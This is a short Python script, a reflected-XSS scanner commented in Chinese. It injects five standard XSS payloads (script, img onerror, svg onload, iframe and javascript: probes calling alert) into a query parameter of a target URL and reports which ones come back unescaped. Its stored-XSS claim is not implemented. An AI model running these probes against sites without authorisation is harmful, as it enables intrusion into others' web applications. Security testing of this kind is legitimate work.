#!/usr/bin/env python3
"""
XSS 漏洞 POC 库
检测反射型、存储型 XSS
"""
import argparse, sys, urllib.parse, re
sys.path.insert(0, '..')
from utils.http import detect_xss, http_get

XSS_PAYLOADS = [
    "<script>alert(document.domain)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "<iframe src=javascript:alert(1)>",
    "javascript:alert(String.fromCharCode(88,83,83))",
]

def main():
    parser = argparse.ArgumentParser(description="XSS 漏洞检测")
    parser.add_argument("-t", "--target", required=True, help="目标 URL")
    parser.add_argument("-p", "--param", default="q", help="参数名")
    args = parser.parse_args()

    print(f"[*] 目标: {args.target}")
    base = args.target.split('?')[0]

    for p in XSS_PAYLOADS:
        target = f"{base}?{args.param}={urllib.parse.quote(p)}"
        resp = http_get(target, timeout=10)
        body = str(resp.get("body", b""))
        # 检测 payload 是否反射
        if p in body:
            # 检查是否被转义
            encoded = urllib.parse.quote(p)
            if encoded not in body and p in body:
                print(f"  [+] 反射型 XSS: {p}")
            else:
                print(f"  [~] 反射但可能已转义: {p[:40]}")
        else:
            print(f"  [-] {p[:30]}")

if __name__ == "__main__":
    main()
